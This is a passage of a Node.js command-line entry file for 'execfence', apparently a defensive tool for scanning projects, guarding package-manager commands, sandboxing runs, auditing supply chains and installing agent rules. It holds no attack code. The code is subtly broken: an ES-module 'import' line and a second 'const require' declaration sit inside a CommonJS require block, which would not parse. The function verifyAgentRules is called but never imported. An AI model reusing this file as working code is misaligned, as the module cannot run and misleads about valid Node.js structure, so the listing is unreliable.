'use strict';

const os = require('node:os');
const path = require('node:path');
const { execFileSync, execSync } = require('node:child_process');
const {
  guardrailsRule,
  installAgentRules,
  installCodexSkill,
  installSkillDefaults,
} = require('./agent-rules');
const { scan } = require('./scanner');
const { detectStack, initProject } = require('./init');
const { changedFiles, scanHistory } = require('./git');
const { installGitHook } = require('./hooks');
const { formatFindings, formatResult } = require('./output');
const { explainFinding } = require('./explain');
const { analyzeCoverage } = require('./coverage');
const { writeReport } = require('./report');
const { runDoctor } = require('./doctor');
const { ensureReportsGitignore } = require('./gitignore');
const { runWithFence } = require('./runtime');
const { runCi } = require('./ci');
const { adoptProject } = require('./adopt');
const { generateManifest, writeManifest, readManifest, diffManifest } = require('./manifest');
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const {
  compareReports,
  diffReports,
  htmlReport,
  incidentBundle,
  incidentFromReport,
  incidentTimeline,
  latestReport,
  latestReportSummary,
  listReports,
  markdownReport,
  pruneReports,
  prCommentFromReport,
  readReport,
  riskRegression,
} = require('./investigation');
const { enrichFindings, redactionPreview } = require('./enrichment');
const { agentReport } = require('./agent-report');
const { lockfileDiff, packAudit, trustAdd, trustAudit } = require('./supply-chain');
const { collectDependencies, depsDiff } = require('./deps');
const { formatReviewText, reviewDependencies } = require('./deps-review');
const { wireProject } = require('./wire');
const { guardDisable, guardEnable, guardGlobalDisable, guardGlobalEnable, guardGlobalStatus, guardPlan, guardStatus } = require('./guard');
const { runNpmGuard } = require('./npm-guard');
const { formatConfigValidation, validateConfig } = require('./config-validate');
const { addBaselineFromReport } = require('./baseline');
const { explainPolicy, testPolicy } = require('./policy');
const {
  explainSandbox,
  helperAudit,
  initSandbox,
  installHelperMetadata,
  sandboxCapabilities,
  sandboxPlan,
  uninstallHelperMetadata,
} = require('./sandbox');

const commandGroups = [
  {
    title: 'Guarded execution',
    commands: [
      ['execfence run [--sandbox] [--sandbox-mode audit|enforce] [--allow-degraded] [--record-artifacts] [--deny-on-new-executable] [--dependency-behavior-audit] -- <command>', 'Scan before running a command, then write runtime evidence; --sandbox enforce requires a verified helper.'],
      ['execfence coverage [--fix-suggestions] [--format text|json]', 'Find build/dev/test/package entrypoints not covered by ExecFence.'],
      ['execfence wire [--dry-run|--apply]', 'Preview or apply project-local wrappers around risky entrypoints.'],
    ],
  },
  {
    title: 'Scanning',
    commands: [
      ['execfence scan [paths...]', 'Scan files or the current project for blocking findings.'],
      ['execfence scan [--mode block|audit] [--fail-on list] [--changed-only] [--report <dir>] --ci [--format text|json|sarif] [paths...]', 'Run scan in CI/reporting mode with machine-readable output.'],
      ['execfence diff-scan [--staged] [--mode block|audit] [--fail-on list]', 'Scan changed or staged files only.'],
      ['execfence scan-history [--max-commits <n>] [--format text|json|sarif] [--include-self]', 'Scan recent git history for suspicious content.'],
      ['execfence explain <finding-id>', 'Explain a scanner finding and expected remediation path.'],
    ],
  },
  {
    title: 'npm/global guard',
    commands: [
      ['execfence guard status', 'Show project guardrail status and remaining unprotected entrypoints.'],
      ['execfence guard plan', 'Show the automatic project guardrail plan without writing files.'],
      ['execfence guard enable [--apply]', 'Plan or apply project config, wrappers, CI wiring, and local agent rules.'],
      ['execfence guard disable', 'Remove generated project wrappers/rules while preserving evidence.'],
      ['execfence guard global-status', 'Show global package-manager shim status, real command resolution, and profile coverage.'],
      ['execfence guard global-enable', 'Install global skill/rules plus reversible multi-ecosystem package-manager shims.'],
      ['execfence guard global-disable', 'Remove global package-manager shims and marked PATH profile blocks.'],
    ],
  },
  {
    title: 'CI/release',
    commands: [
      ['execfence ci [--base-ref <ref>]', 'Run the CI guardrail bundle for scan, manifest, deps, trust, and package checks.'],
      ['execfence publish [--real]', 'Run release checks, dry-run package contents, and optionally publish.'],
      ['execfence pr-comment --report <report.json>', 'Render a report summary suitable for a pull request comment.'],
      ['execfence config validate [--format json] [--strict]', 'Validate ExecFence config, baseline, signatures, sandbox, and local policy packs.'],
    ],
  },
  {
    title: 'Supply chain',
    commands: [
      ['execfence deps diff [--base-ref <ref>]', 'Compare dependency and lockfile risk against a base ref.'],
      ['execfence deps review [--base-ref <ref>] [--format text|json] [--package-manager auto|npm|pnpm|yarn|bun|pip|uv|poetry|cargo|go|maven|gradle|nuget|composer|bundler]', 'Review changed packages across supported ecosystems with guarded metadata checks.'],
      ['execfence manifest', 'Write the current execution-surface manifest.'],
      ['execfence manifest diff', 'Detect new or changed execution entrypoints.'],
      ['execfence pack-audit', 'Audit package contents before npm publish or handoff.'],
    ],
  },
  {
    title: 'Reports/incidents',
    commands: [
      ['execfence report [--dir <dir>] [paths...]', 'Run a scan and write a timestamped JSON evidence report.'],
      ['execfence report --html <report.json>', 'Render a local HTML report.'],
      ['execfence report --markdown <report.json>', 'Render a local Markdown report.'],
      ['execfence reports list|latest|show <id>|open <id>|diff <a> <b>|compare [--since <report>]|regression [--since <report>]|prune', 'Inspect, compare, open, and prune saved reports.'],
      ['execfence incident create|bundle|timeline --from-report <report.json>', 'Create incident artifacts and timelines from report evidence.'],
      ['execfence enrich [--preview] <report.json>', 'Preview or apply optional report enrichment and redaction.'],
    ],
  },
  {
    title: 'Policy/baseline/trust',
    commands: [
      ['execfence baseline add --from-report <report.json> --owner <owner> --reason <reason> --expires-at <date>', 'Create reviewed, expiring exceptions from report findings.'],
      ['execfence policy explain|test [--policy-pack <name>]', 'Explain or test policy pack behavior.'],
      ['execfence trust add <path> --reason <reason> --owner <owner> --expires-at <date>', 'Trust a reviewed artifact, registry, action, or package source.'],
      ['execfence trust audit', 'Audit configured trust stores for drift and expiry.'],
    ],
  },
  {
    title: 'Sandbox',
    commands: [
      ['execfence sandbox init', 'Create the default sandbox policy file.'],
      ['execfence sandbox doctor', 'Check local sandbox enforcement capabilities.'],
      ['execfence sandbox plan -- <command>', 'Explain the sandbox policy that would apply to a command.'],
      ['execfence sandbox explain', 'Describe sandbox behavior, boundaries, and degraded modes.'],
      ['execfence sandbox install-helper [--metadata <file>|--binary <file>]|uninstall-helper|helper-audit', 'Manage or audit verified platform helper metadata and binaries.'],
      ['execfence helper audit', 'Audit installed helper metadata directly.'],
    ],
  },
  {
    title: 'Agent integration',
    commands: [
      ['execfence agent-report', 'Review agent, MCP, tool, and instruction-file execution surfaces.'],
      ['execfence install-skill [--codex-home <path>] [--home <path>]', 'Install the ExecFence skill for Codex-compatible agents.'],
      ['execfence install-agent-rules [--scope global|project|both] [--verify] [--home <path>] [--project <path>]', 'Install or verify portable agent rules.'],
      ['execfence print-agents-snippet', 'Print the portable AGENTS.md rule snippet.'],
    ],
  },
  {
    title: 'Setup',
    commands: [
      ['execfence init [--preset auto|node|go|tauri|python|rust] [--dry-run]', 'Create project config and recommended guardrail scaffolding.'],
      ['execfence detect', 'Detect project stack and execution surfaces.'],
      ['execfence adopt [--write-baseline]', 'Adopt ExecFence in an existing noisy repository.'],
      ['execfence doctor', 'Run a self-check against a known malicious fixture.'],
      ['execfence install-hooks', 'Install the local git hook integration.'],
      ['execfence --help | execfence help', 'Show this command reference.'],
    ],
  },
];

function usage() {
  const lines = [
    'execfence',
    '',
    'Usage:',
    '  execfence <command> [options]',
    '  execfence --help',
    '  execfence help',
    '',
    'Default:',
    '  execfence    Run execfence scan in the current directory.',
    '',
    'Commands:',
  ];
  for (const group of commandGroups) {
    lines.push('', `${group.title}:`);
    for (const [syntax, description] of group.commands) {
      lines.push(`  ${syntax}`);
      lines.push(`      ${description}`);
    }
  }
  lines.push(
    '',
    'Examples:',
    '  npx --yes execfence guard global-enable',
    '  npx --yes execfence guard global-disable',
    '  npx --yes execfence guard enable --apply',
    '  npx --yes execfence run -- npm test',
    '  npx --yes execfence scan --ci --format json .',
    '  npx --yes execfence init',
    '',
  );
  return lines.join('\n');
}

async function main(args) {
  const command = args[0] || 'scan';
  if (command === '-h' || command === '--help' || command === 'help') {
    console.log(usage());
    return;
  }
  if (command === 'run') {
    const delimiter = args.indexOf('--');
    const commandArgs = delimiter >= 0 ? args.slice(delimiter + 1) : args.slice(1);
    const result = runWithFence(commandArgs, {
      sandbox: args.includes('--sandbox'),
      sandboxMode: readOption(args.slice(1), '--sandbox-mode'),
      allowDegraded: args.includes('--allow-degraded'),
      recordArtifacts: args.includes('--record-artifacts'),
      denyOnNewExecutable: args.includes('--deny-on-new-executable'),
      dependencyBehaviorAudit: args.includes('--dependency-behavior-audit'),
    });
    const report = writeAutomaticReport(result, { command: `execfence ${args.join(' ')}` });
    console.error(`[execfence] runtime report: ${report.filePath}`);
    if (!result.ok) {
      process.exitCode = result.runtimeTrace?.exitCode || 1;
    }
    return;
  }
  if (command === 'npm-guard') {
    const result = runNpmGuard(args[1] || 'npm', args.slice(2));
    process.exitCode = result.exitCode ?? (result.ok ? 0 : 1);
    return;
  }
  if (command === 'scan') {
    const parsed = parseScanArgs(args.slice(1));
    const roots = parsed.changedOnly ? changedFiles(process.cwd()) : parsed.paths;
    const result = scan({
      roots,
      configPath: parsed.configPath,
      mode: parsed.mode,
      failOn: parsed.failOn,
      warnOn: parsed.warnOn,
      fullIocScan: parsed.fullIocScan,
    });
    writeAutomaticReport(result, { reportDir: parsed.reportDir, command: `execfence ${args.join(' ')}` });
    const format = parsed.ci && parsed.format === 'text' ? 'json' : parsed.format;
    console.log(formatResult(result, format));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'diff-scan') {
    const parsed = parseScanArgs(args.slice(1));
    const staged = args.includes('--staged');
    const files = changedFiles(process.cwd(), { staged });
    if (files.length === 0) {
      writeAutomaticReport({
        cwd: process.cwd(),
        mode: parsed.mode || 'block',
        ok: true,
        findings: [],
        blockedFindings: [],
        warningFindings: [],
        suppressedFindings: [],
        config: {},
        roots: [],
      }, { reportDir: parsed.reportDir, command: `execfence ${args.join(' ')}` });
      console.log('[execfence] OK');
      return;
    }
    const result = scan({ roots: files, mode: parsed.mode, failOn: parsed.failOn, warnOn: parsed.warnOn, fullIocScan: parsed.fullIocScan });
    writeAutomaticReport(result, { reportDir: parsed.reportDir, command: `execfence ${args.join(' ')}` });
    console.log(formatFindings(result.findings, result));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'scan-history') {
    const result = scanHistory(process.cwd(), {
      includeSelf: args.includes('--include-self'),
      maxCommits: readOption(args.slice(1), '--max-commits'),
    });
    writeAutomaticReport(result, { command: `execfence ${args.join(' ')}` });
    console.log(formatResult(result, readOption(args.slice(1), '--format') || 'text'));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'coverage') {
    const parsed = parseScanArgs(args.slice(1));
    const result = analyzeCoverage(process.cwd());
    console.log(parsed.format === 'json' ? JSON.stringify(result, null, 2) : formatCoverage(result));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'wire') {
    const result = wireProject(process.cwd(), { dryRun: !args.includes('--apply') });
    console.log(JSON.stringify(result, null, 2));
    return;
  }
  if (command === 'guard') {
    guardCommand(args.slice(1));
    return;
  }
  if (command === 'adopt') {
    const result = adoptProject(process.cwd(), {
      baseRef: readOption(args.slice(1), '--base-ref'),
      fullIocScan: args.includes('--full-ioc-scan'),
      writeSuggestedBaseline: args.includes('--write-baseline'),
    });
    writeAutomaticReport(result, { command: `execfence ${args.join(' ')}` });
    console.log(JSON.stringify(result, null, 2));
    return;
  }
  if (command === 'ci') {
    const result = runCi(process.cwd(), { baseRef: readOption(args.slice(1), '--base-ref'), fullIocScan: args.includes('--full-ioc-scan'), strictConfig: args.includes('--strict') });
    writeAutomaticReport(result, { command: `execfence ${args.join(' ')}` });
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'deps') {
    depsCommand(args.slice(1));
    return;
  }
  if (command === 'manifest') {
    if (args[1] === 'diff') {
      const previous = readManifest(process.cwd());
      const current = generateManifest(process.cwd());
      const result = diffManifest(current, previous);
      writeManifest(process.cwd(), current);
      console.log(JSON.stringify(result, null, 2));
      if (!result.ok) {
        process.exitCode = 1;
      }
      return;
    }
    const manifest = writeManifest(process.cwd());
    console.log(JSON.stringify(manifest, null, 2));
    return;
  }
  if (command === 'report') {
    const htmlInput = readOption(args.slice(1), '--html');
    if (htmlInput) {
      const output = htmlReport(process.cwd(), htmlInput);
      console.log(`[execfence] wrote HTML report to ${output.htmlPath}`);
      return;
    }
    const markdownInput = readOption(args.slice(1), '--markdown');
    if (markdownInput) {
      const output = markdownReport(process.cwd(), markdownInput);
      console.log(`[execfence] wrote Markdown report to ${output.markdownPath}`);
      return;
    }
    const parsed = parseScanArgs(args.slice(1));
    const result = scan({ roots: parsed.paths, mode: parsed.mode, failOn: parsed.failOn, warnOn: parsed.warnOn, fullIocScan: parsed.fullIocScan });
    writeAutomaticReport(result, { reportDir: parsed.reportDir || readOption(args.slice(1), '--dir'), command: `execfence ${args.join(' ')}`, stdout: true });
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'reports') {
    reportsCommand(args.slice(1));
    return;
  }
  if (command === 'config') {
    configCommand(args.slice(1));
    return;
  }
  if (command === 'incident') {
    incidentCommand(args.slice(1));
    return;
  }
  if (command === 'enrich') {
    enrichCommand(args.slice(1));
    return;
  }
  if (command === 'policy') {
    policyCommand(args.slice(1));
    return;
  }
  if (command === 'sandbox') {
    sandboxCommand(args.slice(1));
    return;
  }
  if (command === 'helper') {
    helperCommand(args.slice(1));
    return;
  }
  if (command === 'pack-audit') {
    const result = packAudit(process.cwd());
    result.lockfiles = lockfileDiff(process.cwd());
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok || !result.lockfiles.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'trust') {
    trustCommand(args.slice(1));
    return;
  }
  if (command === 'baseline') {
    baselineCommand(args.slice(1));
    return;
  }
  if (command === 'agent-report') {
    const result = agentReport(process.cwd());
    console.log(JSON.stringify(result, null, 2));
    return;
  }
  if (command === 'pr-comment') {
    const reportPath = readOption(args.slice(1), '--report');
    if (!reportPath) {
      throw new Error('Usage: execfence pr-comment --report <report.json>');
    }
    const { report } = readReport(process.cwd(), reportPath);
    console.log(prCommentFromReport(report));
    return;
  }
  if (command === 'doctor') {
    const result = runDoctor({ multiEcosystem: args.includes('--multi-ecosystem') });
    const reportResult = {
      cwd: process.cwd(),
      mode: 'doctor',
      ok: result.ok,
      findings: result.findings || [],
      blockedFindings: result.ok ? [] : result.findings || [],
      warningFindings: [],
      suppressedFindings: [],
      config: {},
      roots: [result.fixtureDir],
    };
    writeAutomaticReport(reportResult, { command: `execfence ${args.join(' ')}` });
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (command === 'explain') {
    console.log(explainFinding(args[1]));
    return;
  }
  if (command === 'detect') {
    console.log(JSON.stringify(detectStack(process.cwd()), null, 2));
    return;
  }
  if (command === 'init') {
    const result = initProject({ cwd: process.cwd(), preset: readOption(args.slice(1), '--preset') || 'auto', dryRun: args.includes('--dry-run') });
    console.log(`[execfence] detected stack: ${JSON.stringify(result.stack)}`);
    console.log(`[execfence] preset: ${result.preset}`);
    if (result.changes.length === 0) {
      console.log('[execfence] no changes needed');
      return;
    }
    for (const change of result.changes) {
      console.log(`- ${change}`);
    }
    return;
  }
  if (command === 'install-hooks') {
    const hookPath = installGitHook(process.cwd());
    console.log(`[execfence] installed pre-commit hook at ${hookPath}`);
    return;
  }
  if (command === 'install-skill') {
    installSkill(args.slice(1));
    return;
  }
  if (command === 'install-agent-rules') {
    installAgentRulesCommand(args.slice(1));
    return;
  }
  if (command === 'print-agents-snippet') {
    console.log(agentsSnippet());
    return;
  }
  if (command === 'publish') {
    publishPackage({ real: args.includes('--real') });
    return;
  }
  throw new Error(`Unknown command: ${command}\n\n${usage()}`);
}

function reportsCommand(args) {
  const subcommand = args[0] || 'list';
  if (subcommand === 'list') {
    console.log(JSON.stringify(listReports(process.cwd()), null, 2));
    return;
  }
  if (subcommand === 'latest') {
    const format = readOption(args, '--format') || 'text';
    const result = format === 'json' ? latestReport(process.cwd()) : latestReportSummary(process.cwd());
    console.log(format === 'json' ? JSON.stringify(result, null, 2) : formatLatestReport(result));
    return;
  }
  if (subcommand === 'show') {
    const id = args[1];
    if (!id) {
      throw new Error('Usage: execfence reports show <id>');
    }
    console.log(JSON.stringify(readReport(process.cwd(), id).report, null, 2));
    return;
  }
  if (subcommand === 'open') {
    const output = htmlReport(process.cwd(), args[1]);
    console.log(`[execfence] wrote HTML report to ${output.htmlPath}`);
    return;
  }
  if (subcommand === 'diff') {
    if (!args[1] || !args[2]) {
      throw new Error('Usage: execfence reports diff <a> <b>');
    }
    console.log(JSON.stringify(diffReports(process.cwd(), args[1], args[2]), null, 2));
    return;
  }
  if (subcommand === 'compare') {
    console.log(JSON.stringify(compareReports(process.cwd(), { since: readOption(args, '--since') }), null, 2));
    return;
  }
  if (subcommand === 'regression') {
    console.log(JSON.stringify(riskRegression(process.cwd(), { since: readOption(args, '--since') }), null, 2));
    return;
  }
  if (subcommand === 'prune') {
    console.log(JSON.stringify(pruneReports(process.cwd(), {
      maxReports: readOption(args, '--max-reports'),
      maxAgeDays: readOption(args, '--max-age-days'),
    }), null, 2));
    return;
  }
  throw new Error(`Unknown reports subcommand: ${subcommand}`);
}

function formatLatestReport(result) {
  if (!result) {
    return '[execfence] no reports found';
  }
  const summary = result.blockingSummary || {};
  return [
    `[execfence] latest report: ${result.id}`,
    `status: ${summary.status || result.status || 'unknown'}`,
    `risk: ${result.changeRisk?.level || 'unknown'}`,
    `why blocked: ${summary.whyBlocked || 'No blocking findings were detected.'}`,
    `how it can execute: ${summary.howItCanExecute || 'No suspicious execution surface was observed.'}`,
    `affected ecosystem: ${summary.affectedEcosystem || 'unknown'}`,
    `next: ${summary.recommendedNextAction || 'No immediate action required.'}`,
    `file: ${result.filePath}`,
  ].join('\n');
}

function incidentCommand(args) {
  const subcommand = args[0] || 'create';
  const reportPath = readOption(args, '--from-report');
  if (!reportPath) {
    throw new Error('Usage: execfence incident create|bundle|timeline --from-report <report.json>');
  }
  if (subcommand === 'create' || subcommand === 'checklist') {
    const output = incidentFromReport(process.cwd(), reportPath, { profile: readOption(args, '--profile') });
    console.log(`[execfence] wrote incident checklist to ${output.incidentPath}`);
    return;
  }
  if (subcommand === 'bundle') {
    const output = incidentBundle(process.cwd(), reportPath);
    console.log(`[execfence] wrote incident bundle to ${output.bundleDir}`);
    return;
  }
  if (subcommand === 'timeline') {
    const output = incidentTimeline(process.cwd(), reportPath);
    console.log(`[execfence] wrote incident timeline to ${output.timelinePath}`);
    return;
  }
  throw new Error(`Unknown incident subcommand: ${subcommand}`);
}

function depsCommand(args) {
  const subcommand = args[0] || 'diff';
  if (subcommand === 'diff') {
    const result = depsDiff(process.cwd(), { baseRef: readOption(args, '--base-ref') || 'HEAD', packageManager: readOption(args, '--package-manager') || 'auto' });
    result.review = reviewDependencies(process.cwd(), {
      baseRef: readOption(args, '--base-ref') || 'HEAD',
      packageManager: readOption(args, '--package-manager') || 'auto',
    });
    result.findings = [...(result.findings || []), ...(result.review.findings || [])];
    result.ok = result.ok && result.review.ok;
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (subcommand === 'review') {
    const result = reviewDependencies(process.cwd(), {
      baseRef: readOption(args, '--base-ref') || 'HEAD',
      packageManager: readOption(args, '--package-manager') || 'auto',
    });
    const format = readOption(args, '--format') || 'text';
    console.log(format === 'json' ? JSON.stringify(result, null, 2) : formatReviewText(result));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (subcommand === 'list') {
    console.log(JSON.stringify(collectDependencies(process.cwd()), null, 2));
    return;
  }
  throw new Error('Usage: execfence deps diff|review [--base-ref <ref>] [--format text|json] [--package-manager auto|npm|pnpm|yarn|bun|pip|uv|poetry|cargo|go|maven|gradle|nuget|composer|bundler]');
}

function configCommand(args) {
  const subcommand = args[0] || 'validate';
  if (subcommand !== 'validate') {
    throw new Error('Usage: execfence config validate [--format json] [--strict]');
  }
  const result = validateConfig(process.cwd(), { strict: args.includes('--strict') });
  const format = readOption(args, '--format') || 'text';
  console.log(format === 'json' ? JSON.stringify(result, null, 2) : formatConfigValidation(result));
  if (!result.ok) {
    process.exitCode = 1;
  }
}

function guardCommand(args) {
  const subcommand = args[0] || 'status';
  if (subcommand === 'status') {
    const result = guardStatus(process.cwd());
    console.log(JSON.stringify(result, null, 2));
    return;
  }
  if (subcommand === 'plan') {
    console.log(JSON.stringify(guardPlan(process.cwd()), null, 2));
    return;
  }
  if (subcommand === 'enable') {
    console.log(JSON.stringify(guardEnable(process.cwd(), { apply: args.includes('--apply') }), null, 2));
    return;
  }
  if (subcommand === 'disable') {
    console.log(JSON.stringify(guardDisable(process.cwd()), null, 2));
    return;
  }
  if (subcommand === 'global-status') {
    const result = guardGlobalStatus({
      home: readOption(args, '--home'),
      codexHome: readOption(args, '--codex-home'),
    });
    const format = readOption(args, '--format') || 'text';
    console.log(format === 'json' ? JSON.stringify(result, null, 2) : formatGlobalGuardStatus(result));
    return;
  }
  if (subcommand === 'global-enable') {
    console.log(JSON.stringify(guardGlobalEnable({
      home: readOption(args, '--home'),
      codexHome: readOption(args, '--codex-home'),
    }), null, 2));
    return;
  }
  if (subcommand === 'global-disable') {
    console.log(JSON.stringify(guardGlobalDisable({
      home: readOption(args, '--home'),
      codexHome: readOption(args, '--codex-home'),
    }), null, 2));
    return;
  }
  throw new Error('Usage: execfence guard status|enable|disable|plan|global-status|global-enable|global-disable [--apply]');
}

function formatGlobalGuardStatus(result) {
  const lines = [
    `[execfence] global guard: ${result.ok ? 'OK' : 'needs action'}`,
    `shim dir: ${result.npmGuard?.shimDir || ''}`,
    `current PATH active: ${Boolean(result.npmGuard?.activeInPath)}`,
    '',
    'Action plan:',
    ...(result.npmGuard?.actionPlan || result.shellInterception?.actionPlan || []).map((item) => `- [${item.severity}] ${item.id}: ${item.reason}\n  ${item.command}`),
    '',
    'Tools:',
    ...(result.npmGuard?.tools || []).filter((tool) => tool.installedShim || tool.realCommand).map((tool) => `- ${tool.tool} (${tool.ecosystem}): ${tool.risk}${tool.realCommand ? `, real=${tool.realCommand}` : ''}`),
  ];
  return lines.join('\n');
}

function enrichCommand(args) {
  const reportPath = args.includes('--preview') ? args.find((item) => item !== '--preview') : args[0];
  if (!reportPath) {
    throw new Error('Usage: execfence enrich [--preview] <report.json>');
  }
  const { filePath, report } = readReport(process.cwd(), reportPath);
  if (args.includes('--preview')) {
    console.log(JSON.stringify(redactionPreview(report.findings || [], report.config || {}), null, 2));
    return;
  }
  const enrichment = enrichFindings(process.cwd(), report.findings || [], report.config || {});
  const enriched = {
    ...report,
    enrichment,
  };
  const output = filePath.replace(/\.json$/i, '.enriched.json');
  require('node:fs').writeFileSync(output, `${JSON.stringify(enriched, null, 2)}\n`);
  console.log(`[execfence] wrote enriched report to ${output}`);
}

function policyCommand(args) {
  const subcommand = args[0] || 'explain';
  const policyPack = readOption(args, '--policy-pack');
  const config = policyPack ? { policyPack } : {};
  if (subcommand === 'explain') {
    console.log(JSON.stringify(explainPolicy(process.cwd(), config), null, 2));
    return;
  }
  if (subcommand === 'test') {
    const result = testPolicy(process.cwd(), config);
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  throw new Error('Usage: execfence policy explain|test [--policy-pack <name>]');
}

function sandboxCommand(args) {
  const subcommand = args[0] || 'doctor';
  if (subcommand === 'init') {
    console.log(JSON.stringify(initSandbox(process.cwd(), { dryRun: args.includes('--dry-run') }), null, 2));
    return;
  }
  if (subcommand === 'doctor') {
    const result = sandboxCapabilities(process.cwd());
    writeAutomaticReport({
      cwd: process.cwd(),
      mode: 'sandbox-doctor',
      ok: true,
      findings: [],
      blockedFindings: [],
      warningFindings: [],
      suppressedFindings: [],
      config: {},
      roots: [],
      sandbox: result,
    }, { command: `execfence sandbox ${args.join(' ')}` });
    console.log(JSON.stringify(result, null, 2));
    return;
  }
  if (subcommand === 'plan') {
    const delimiter = args.indexOf('--');
    const commandArgs = delimiter >= 0 ? args.slice(delimiter + 1) : args.slice(1);
    if (!commandArgs.length) {
      throw new Error('Usage: execfence sandbox plan -- <command>');
    }
    const result = sandboxPlan(process.cwd(), commandArgs, {
      mode: readOption(args, '--sandbox-mode') || readOption(args, '--mode') || 'audit',
      profile: readOption(args, '--profile'),
      allowDegraded: args.includes('--allow-degraded'),
    });
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok && result.mode === 'enforce') {
      process.exitCode = 1;
    }
    return;
  }
  if (subcommand === 'explain') {
    console.log(JSON.stringify(explainSandbox(process.cwd(), {
      mode: readOption(args, '--mode'),
      profile: readOption(args, '--profile'),
    }), null, 2));
    return;
  }
  if (subcommand === 'helper-audit') {
    const result = helperAudit(process.cwd());
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (subcommand === 'install-helper') {
    const result = installHelperMetadata(process.cwd(), readOption(args, '--metadata'), {
      binary: readOption(args, '--binary'),
    });
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  if (subcommand === 'uninstall-helper') {
    console.log(JSON.stringify(uninstallHelperMetadata(process.cwd()), null, 2));
    return;
  }
  throw new Error('Usage: execfence sandbox init|doctor|plan|explain|install-helper [--metadata <file>|--binary <file>]|uninstall-helper|helper-audit');
}

function helperCommand(args) {
  if (args[0] === 'audit') {
    const result = helperAudit(process.cwd());
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  throw new Error('Usage: execfence helper audit');
}

function trustCommand(args) {
  const subcommand = args[0];
  if (subcommand === 'add') {
    const file = args[1];
    const result = trustAdd(process.cwd(), file, {
      reason: readOption(args, '--reason'),
      owner: readOption(args, '--owner'),
      expiresAt: readOption(args, '--expires-at'),
      type: readOption(args, '--type'),
    });
    console.log(JSON.stringify(result, null, 2));
    return;
  }
  if (subcommand === 'audit') {
    const result = trustAudit(process.cwd());
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  throw new Error('Usage: execfence trust add <path> --reason <reason> --owner <owner> --expires-at <date>\n       execfence trust audit');
}

function baselineCommand(args) {
  if (args[0] === 'add') {
    const result = addBaselineFromReport(process.cwd(), readOption(args, '--from-report'), {
      owner: readOption(args, '--owner'),
      reason: readOption(args, '--reason'),
      expiresAt: readOption(args, '--expires-at'),
    });
    console.log(JSON.stringify(result, null, 2));
    return;
  }
  throw new Error('Usage: execfence baseline add --from-report <report.json> --owner <owner> --reason <reason> --expires-at <date>');
}

function installSkill(args) {
  const codexHomeFlag = args.indexOf('--codex-home');
  const homeFlag = args.indexOf('--home');
  const codexHome = codexHomeFlag >= 0 && args[codexHomeFlag + 1]
    ? path.resolve(args[codexHomeFlag + 1])
    : path.join(os.homedir(), '.codex');
  const home = homeFlag >= 0 && args[homeFlag + 1] ? path.resolve(args[homeFlag + 1]) : os.homedir();
  const installed = installCodexSkill({ codexHome });
  const defaults = installSkillDefaults({ home });
  const rules = installAgentRules({ scope: 'global', home });
  console.log(`[execfence] installed Codex skill at ${installed.skillDir}`);
  console.log(`[execfence] installed ExecFence defaults at ${defaults.filePath}`);
  console.log(`[execfence] updated Codex AGENTS.md at ${installed.agents.filePath}`);
  for (const rule of rules) {
    console.log(`[execfence] updated agent rules at ${rule.filePath}`);
  }
}

function writeAutomaticReport(result, options = {}) {
  ensureReportsGitignore(result.cwd || process.cwd(), result.config || {});
  const report = writeReport(result, { reportDir: options.reportDir, command: options.command });
  const retention = result.config?.reports?.retention || result.config?.reportRetention;
  if (retention) {
    pruneReports(result.cwd || process.cwd(), retention);
  }
  result.report = {
    filePath: report.filePath,
    reportDir: report.reportDir,
  };
  const stream = options.stdout ? console.log : console.error;
  stream(`[execfence] wrote report to ${report.filePath}`);
  return report;
}

function installAgentRulesCommand(args) {
  if (args.includes('--verify')) {
    const scope = readOption(args, '--scope') || 'both';
    const home = readOption(args, '--home') || os.homedir();
    const project = readOption(args, '--project') || process.cwd();
    const result = verifyAgentRules({ scope, home, project });
    console.log(JSON.stringify(result, null, 2));
    if (!result.ok) {
      process.exitCode = 1;
    }
    return;
  }
  const scope = readOption(args, '--scope') || 'global';
  const home = readOption(args, '--home') || os.homedir();
  const project = readOption(args, '--project') || process.cwd();
  const rules = installAgentRules({ scope, home, project });
  for (const rule of rules) {
    console.log(`[execfence] updated agent rules at ${rule.filePath}`);
  }
}

function agentsSnippet() {
  return `${guardrailsRule()}\n`;
}

function updateGlobalAgents(codexHome) {
  return installCodexSkill({ codexHome }).agents.filePath;
}

function readOption(args, name) {
  const index = args.indexOf(name);
  return index >= 0 ? args[index + 1] : undefined;
}

function parseScanArgs(args) {
  const paths = [];
  let format = 'text';
  let configPath;
  let reportDir;
  for (let index = 0; index < args.length; index += 1) {
    const arg = args[index];
    if (arg === '--ci') {
      continue;
    }
    if (arg === '--format') {
      format = args[index + 1] || 'text';
      index += 1;
      continue;
    }
    if (arg === '--config') {
      configPath = args[index + 1];
      index += 1;
      continue;
    }
    if (arg === '--mode') {
      index += 1;
      continue;
    }
    if (arg === '--fail-on' || arg === '--warn-on' || arg === '--report' || arg === '--dir') {
      if (arg === '--report' || arg === '--dir') {
        reportDir = args[index + 1];
      }
      index += 1;
      continue;
    }
    if (arg === '--staged') {
      continue;
    }
    if (arg === '--changed-only' || arg === '--full-ioc-scan') {
      continue;
    }
    paths.push(arg);
  }
  return {
    ci: args.includes('--ci'),
    configPath,
    format,
